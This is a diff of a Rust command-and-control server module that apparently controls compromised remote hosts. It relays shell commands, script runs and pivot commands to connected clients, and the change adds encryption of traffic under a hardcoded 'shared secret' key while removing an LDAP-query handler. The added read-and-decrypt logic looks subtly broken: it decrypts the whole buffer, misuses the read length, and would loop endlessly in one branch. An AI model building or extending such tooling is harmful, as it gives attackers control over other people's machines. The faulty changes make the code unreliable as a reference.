@@ -1,7 +1,6 @@
 use std::collections::HashMap;
 use std::fs::File;
 use base64::{Engine as _, engine::general_purpose};
-use simple_crypt::decrypt;
 // use colored::Colorize;
 use std::io::{BufReader, Read, Write};
 use std::sync::Arc;
@@ -9,6 +8,8 @@ use tokio::net::TcpStream;
 use tokio::sync::Mutex;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::time::{Duration, timeout};
+
+use simple_crypt::{encrypt, decrypt};
 
 #[derive(Debug)]
 pub struct ConnectionInfo {
@@ -103,45 +104,6 @@ pub async fn handle_run_script(active_connections: &Arc<Mutex<HashMap<String, Co
     cmdout = cmdout.replace("||cmd||", "");
     Ok(cmdout.trim().to_string())
 }
-pub async fn handle_ldap(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, ) -> Result<String, String> {
-    let parts: Vec<&str> = command.split(" ").collect();
-    if parts.len() < 3 {
-        return Err("Invalid command, expected 'cmd ID command'".to_string());
-    }
-    let id: usize = match parts[1].trim().parse() {
-        Ok(num) => num,
-        Err(_) => return Err("Invalid ID".to_string()),
-    };
-    let ldap_query = parts[2];
-    let active_connections = active_connections.lock().await;
-
-    if id > active_connections.len() {
-        return Err("Invalid ID".to_string());
-    }
-    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
-    let stream = connection_info.stream.clone();
-    let is_pivot = connection_info.is_pivot;
-    let command = if is_pivot {
-        format!("||PIVOTCMD|| ||LDAPQUERY|| {}", ldap_query)
-    } else {
-        format!("||LDAPQUERY|| {}", ldap_query)
-    };
-    timeout(Duration::from_secs(10), stream.lock().await
-    .read(&mut [0u8; 1024])).await.expect("failed timeout").unwrap();
-    stream.lock().await.write(command.as_bytes()).await.expect("Error writing to stream");
-    stream.lock().await.flush().await.expect("Error flushing stream");
-    let mut cmdout = String::new();
-    while !cmdout.contains("||LDAPQUERY||") {
-        let mut buffer = [0; 1024];
-        let n = match stream.lock().await.read(&mut buffer).await {
-            Ok(n) => n,
-            Err(_) => break,
-        };
-        cmdout.push_str(&String::from_utf8(buffer[..n].to_vec()).unwrap());
-    }
-    cmdout = cmdout.replace("||LDAPQUERY||", "");
-    Ok(cmdout.trim().to_string())
-}
 pub async fn parse_client_info(stream: &mut Arc<Mutex<tokio::net::TcpStream>>, raw_connection: bool) -> (String, String) {
     let mut rbuffer = [0; 1024];
     // let mut wbuffer = String::new();
@@ -181,7 +143,6 @@ pub async fn parse_client_info(stream: &mut Arc<Mutex<tokio::net::TcpStream>>, r
                 // let data = String::from_utf8(rbuffer[..n].to_vec()).expect("Error converting to utf-8");
                 let data = decrypt(&rbuffer, b"shared secret").expect("Failed to decrypt");
                 let data_string = String::from_utf8(data).expect("Failed to convert to String");
-                println!("Received decrypted data: {:?} size {}", data_string, n);
                 let parts: Vec<&str> = data_string.split("||").collect();
                 if parts[1] == "ACSINFO" {
                     return (parts[2].to_string(), parts[3].to_string());
@@ -228,24 +189,21 @@ pub async fn handle_command(
         format!("{} {}", command_prefix, command_str)
     };
     
-    stream.lock().await.write(command.as_bytes()).await.expect("Error writing to stream");
+    let encrypted_command = encrypt(command.as_bytes(), b"shared secret").expect("Failed to encrypt");
+    stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
     stream.lock().await.flush().await.expect("Error flushing stream");
     let mut cmdout = String::new();
+    let mut buffer = [0; 1024];
+    let n = match stream.lock().await.read(&mut buffer).await {
+        Ok(n) => n,
+        Err(_) => return Err("Error reading from stream".to_string()),
+    };
+    let data = decrypt(&buffer, b"shared secret").expect("Failed to decrypt");
     if raw_connection {
-        let mut buffer = [0; 1024];
-        let n = match stream.lock().await.read(&mut buffer).await {
-            Ok(n) => n,
-            Err(_) => return Err("Error reading from stream".to_string()),
-        };
-        cmdout = String::from_utf8(buffer[..n].to_vec()).unwrap();
+        cmdout = String::from_utf8(data[..n].to_vec()).unwrap();
     } else {
         while !cmdout.contains("||cmd||") {
-            let mut buffer = [0; 1024];
-            let n = match stream.lock().await.read(&mut buffer).await {
-                Ok(n) => n,
-                Err(_) => break,
-            };
-            cmdout.push_str(&String::from_utf8(buffer[..n].to_vec()).unwrap());
+            cmdout.push_str(&String::from_utf8(data.to_vec()).unwrap());
         }
         cmdout = cmdout.replace("||cmd||", "");
     }
